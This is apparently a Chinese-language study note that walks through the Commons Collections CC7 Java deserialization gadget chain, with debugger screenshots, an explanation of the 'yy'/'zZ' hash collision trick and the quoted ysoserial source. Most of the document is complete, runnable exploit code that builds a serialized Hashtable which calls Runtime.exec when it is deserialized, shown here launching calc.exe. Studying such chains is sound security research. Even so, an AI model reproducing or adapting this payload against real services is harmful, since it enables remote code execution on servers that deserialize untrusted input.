# CC7

Gadget chain：

```java
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```

Hashtable的readObject：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231215155606.png)

Hashtable的reconstitution：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231215160635.png)

AbstractMapDecorator的equals

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231215162301.png)

AbstractMap的equals

![image-20231215162431862](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20231215162431862.png)

后面就是调用LazyMap的get，与CC5相同。

开始构造exp。首先先把LazyMap的那部分拿过来：

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };
Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后是确保AbstractMap的equals能调用LazyMap的get：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217122549.png)

如图，只要令传入的参数o为outerMap即可。

所以，AbstractMapDecorator需要令map值为AbstractMap![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217123101.png)

但是这个类既没有实现Serializable接口，构造函数也不是public，甚至map还是transient修饰的。

关键的reconstitutionPut那里又是一坨看着很难调用的东西，不知道怎么下手。看一下ysoserial是怎么写的：

```java
        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");
```

yso给出的居然完全没提到中间那两个map，难道是之前理解错了？下断点调试一下。

略作修改：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7_8u65 {
    public static void main(String[] args) throws Exception{
        Transformer fakeTransformers = new ChainedTransformer (new Transformer[]{});
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeTransformers);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeTransformers);
        lazyMap2.put("zZ", 1);
        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakeTransformers,transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

在Hashtable的reconstitutionPut处下断点，看是怎么走到这里的：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217141209.png)

在readObject的第一次for循环里，reconstitutionPut中的tab此时为空，没有走到equals。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217142649.png)

注意这一次循环虽然没有进入for但是后面往tab里存了LazyMap1。

第二次循环时，成功进入：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217143505.png)

进入到判断中，要经过 (e.hash == hash) 判断为真才能走到我们想要的 e.key.equal() 方法中。e.hash是LazyMap1的hash值，而lazyMap1 的 hash 值就是 `"yy".hashCode`，在 java 中有一个小 bug："yy".hashCode() == "zZ".hashCode()。`yy` 和 `zZ` 由 `hashCode()` 计算出来的值是一样的。所以这里我们需要将 map 中 `put()` 的值设置为 `yy` 和 `zZ`，才能走到我们想要的 `e.key.equal()` 方法中。

e.key.equals(key)即LazyMap1.equals(LazyMap2)。

又因为LazyMap里没有这个equals方法，所以他会去找他父类，他的父类为AbstractMapDecorator：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231217155130.png)

在调用完 HashTable.put() 之后，还需要在 map2 中 remove() 掉 yy的原因：因为 Hashtable.put() 实际上也会调用到 equals() 方法。当调用完 equals() 方法后，LazyMap2 的 key 中就会增加一个 yy 键。

这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对。

最终exp：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7_8u65 {
    public static void main(String[] args) throws Exception{
        Transformer fakeTransformers = new ChainedTransformer (new Transformer[]{});
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
        };

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeTransformers);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeTransformers);
        lazyMap2.put("zZ", 1);
        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(fakeTransformers,transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# 总结

这个有点难。